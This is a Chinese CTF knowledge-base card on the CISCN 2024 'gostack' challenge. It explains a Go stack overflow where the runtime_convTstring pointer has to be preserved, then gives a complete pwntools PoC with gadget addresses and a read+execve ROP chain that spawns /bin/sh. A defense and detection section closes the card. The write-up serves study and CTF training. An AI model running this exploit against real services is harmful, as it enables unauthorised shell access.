---
id: binary-pwn-stack-go-gostack-convt-pointer-rop
title: CISCN 2024 gostack：Go 栈溢出保留 convT 字符串指针的 read+execve ROP
type: scenario
domain: binary
path: binary/pwn/stack
technique: go-stack-overflow-preserve-convt-string-pointer
tags:
- pwn
- stack
- stack-overflow
- go
- golang
- rop
- syscall
- ctf
- linux
- amd64
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V192
  verified_at: '2026-11-06T23:06:46+08:00'
  notes: 已对照原文全文核对：buf[72]、v33非零约束、read与execve链与原文exp一致，已按原文补齐gadget填充值；文章未展示flag输出，未本机复跑。
url: /docs/binary/pwn/stack/binary-pwn-stack-go-gostack-convt-pointer-rop/
draft: false
kb_aliases:
- gostack
- CISCN 2024 gostack
- runtime_convTstring
- Go fmt.Fprintf 栈溢出
- Go read execve ROP
- Go 栈溢出保留字符串指针
---

## 一句话结论

CISCN 2024 的 `gostack` 在 `main.main.func3` 中把 `bufio.Scanner` 读到的一行字节逐字节复制进 72 字节栈缓冲区 `buf[72]`，复制长度完全来自输入；溢出除了覆盖返回地址，还会覆盖后面 `runtime_convTstring(v33, ...)` 使用的字符串数据指针，payload 必须把该槽写成非零可读地址（如 BSS），再构造 `read(0, bss, 8)` + `execve(bss, 0, 0)` 的 ROP 链即可拿 shell。

## 原理

- **溢出点**：`main.main.func3` 先 `fmt.Fprintf("Happy magic golang!\n")` 和 `fmt.Fprintf("Your magic message :%s\n")` 提示，再用 `bufio.Scanner.Scan` 读取一行；`runtime_slicebytetostring` 把输入字节切片转成字符串 `v33`（数据指针）与 `v34`（长度）。
- **无界复制**：随后是 `p_buf = buf; p_buf_1 = p_buf; v24 = (uint8 *)v33; for (i = 0; v14 > i; ++i) { v19 = *v24; *p_buf_1++ = v19; ++v24; }`。循环上界 `v14` 就是用户输入长度，`buf` 只有 `_BYTE buf[72]`（IDA `[rsp+48h] [rbp-1D0h]`），没有任何长度检查，输入超过 72 字节即向返回地址方向覆盖。
- **必须保留 `v33`**：复制完成后代码调用 `runtime_convTstring(v33, v34, ...)`，该函数把 `v33` 指向的字符串数据复制到堆。若溢出把 `v33` 覆盖成 0（例如填充 `\0` 恰好落在该槽），`runtime_convTstring` 会解引用空指针而崩溃，ROP 链根本得不到执行。因此 payload 在对应偏移写入一个可读的非零地址（文章用 BSS 地址 `0x05633C0`），让复制继续正常返回。
- **ROP 原语**：Go 是静态链接，二进制内有大量 `pop|ret` 与 `syscall` 字节序列；用 `ROPgadget --binary ./gostack --only 'pop|ret'` 和 `--only 'syscall'` 找 gadget。该题无 PIE/无栈地址泄露，不能直接 ret2libc，改用系统调用：先 `read(0, bss, 8)` 把 `/bin/sh\0` 写到 BSS，再 `execve(bss, 0, 0)`。
- **地址固定**：exp 使用固定的 gadget 地址（`rdi=0x4a18a5`、`rsi=0x42138a`、`rdx=0x4944ec`、`rax=0x40f984`、`syscall=0x4616C9`），说明二进制关闭 PIE；若目标开启 PIE，需要先泄露代码/栈地址再计算。
- **为什么能打通**：Go 不使用 glibc 的栈 canary，编译器的边界检查只覆盖语言层的切片/数组访问；这里的 `*p_buf_1++ = v19` 是编译器生成的指针写，越界不会触发 panic，返回地址被覆盖后正常 `ret` 即进入 ROP。

## 触发条件

- 目标为 CISCN 2024 `gostack` 或同构的 Go 栈溢出程序：`main.main.func3` 用 `bufio.Scanner` 读入后逐字节复制到固定栈缓冲区，无长度检查。
- 二进制关闭 PIE（或已泄露地址），存在可用的 `pop rax/rbx/rcx/rdx/rsi/rdi` 与 `syscall` gadget。
- 目标允许 `read`/`execve` 系统调用；若被 seccomp 限制，需要改用 `open/read/write`（ORW）。
- 输入长度可超过缓冲区到返回地址的距离；`runtime_convTstring` 的源指针槽必须能被 payload 写到非零可读地址。

## 利用步骤

1. 在 IDA 中定位 `main.main.func3`，确认 `buf[72]`、`bufio__ptr_Scanner_Scan`、`runtime_slicebytetostring` 与逐字节复制循环；记录 `buf` 到返回地址、到 `v33` 槽的偏移（文章 exp 用 `0x100` 处写指针、再 `0xc8` 填充后接链）。
2. 用 `ROPgadget` 找 `pop rdi; ret`、`pop rsi; ret`、`pop rdx; ret`、`pop rax; ret`、`syscall; ret`，确认地址固定（无 PIE）。
3. 构造 payload：`b'a' * 0x100` 填到 `v33` 槽，写入 BSS 地址（如 `0x05633C0`，非零可读）；再填 `0xc8` 字节到返回地址；接 ROP 链。
4. ROP 链：`read(0, bss, 8)` 读入 `/bin/sh\0`，再 `execve(bss, 0, 0)`；注意 `read` 的 fd=0、buf=BSS、len=8，`execve` 的 argv/envp 置 0。
5. 发送 payload 后 sleep/等待，再发送 `b'/bin/sh\0'`，进入交互读 flag。
6. 若远程没有 shell 环境（如题目只允许 ORW），把链改为 `open("/flag")` + `read` + `write`。

## PoC

```python
#!/usr/bin/env python3
from pwn import *

context(log_level="debug", os="linux", arch="amd64")
p = remote("target", 28259)

rdi = 0x00000000004a18a5
rsi = 0x000000000042138a
rdx = 0x00000000004944ec
rax = 0x000000000040f984
syscall = 0x4616C9
bss = 0x05633C0

# 0x100 处覆盖 runtime_convTstring 使用的字符串数据指针 v33（必须非零）
payload  = b'a' * 0x100
payload += p64(bss)
payload += b'\x00' * 0xc8
# 原文 exp 的完整链：read(0, 0x563508, 8)
payload += flat(rax, 0, rdi, 0, 0, 0, 0, 0, 0, rsi, 0x563508, rdx, 8, syscall)
# execve(0x563508, 0, 0)
payload += flat(rax, 59, rdi, 0x563508, 0, 0, 0, 0, 0, rsi, 0, rdx, 0, syscall)

p.sendline(payload)
sleep(1)
p.send(b'/bin/sh\x00')
p.interactive()
```

## 变体与关联

- **同题变体**：若 `v33` 槽不能写非零地址（例如程序在复制后不调用 `runtime_convTstring`），可以省略该约束；若复制循环遇 `\0` 提前停止，则 payload 不能含零字节，需要用 gadget 地址的高字节/短写绕开。
- **无 PIE 与有 PIE**：无 PIE 直接使用固定 gadget；有 PIE 先通过 `fmt` 输出或栈残留泄露代码/栈地址。
- **execve 被禁**：改用 ORW（`open("/flag")`→`read`→`write`），与 [[binary-pwn-stack-ret2syscall-64bit-bss-binsh-execve]] 的 BSS 写入思路一致。
- 与 [[binary-pwn-stack-go-stack-overflow-rop]] 同类：该卡讲 Go 栈溢出通用方法（栈帧偏移、defer、gadget 选择）并以 shellwego/2025pctf 为例；本卡是 gostack 的独立实例，核心差异是必须保留 `runtime_convTstring` 的源字符串指针。

## 检测与防御

- **代码层**：不要用无界循环把输入复制到固定数组；使用 `copy` 并先比较 `len(src)` 与 `len(dst)`；对外部输入做最大长度限制（`bufio.Scanner.Buffer` 也要设上限）。
- **编译/运行层**：启用 PIE（`-buildmode=pie`）；Go 没有 glibc canary，不能依赖 `-fstack-protector`；可开启 `-d=checkptr`（开发/测试）捕获不安全指针越界。
- **CTF 之外**：Go 服务中由 `unsafe`、CGO、汇编或手写解析器引入的栈溢出同样可被 ROP；审计时重点看固定缓冲区、`copy`/逐字节循环、`runtime_convTstring` 等调用附近的长度计算。
- **检测**：监控异常长输入、返回地址落入二进制 gadget 区域、进程执行 `execve("/bin/sh")`；栈上出现 ROP gadget 序列。
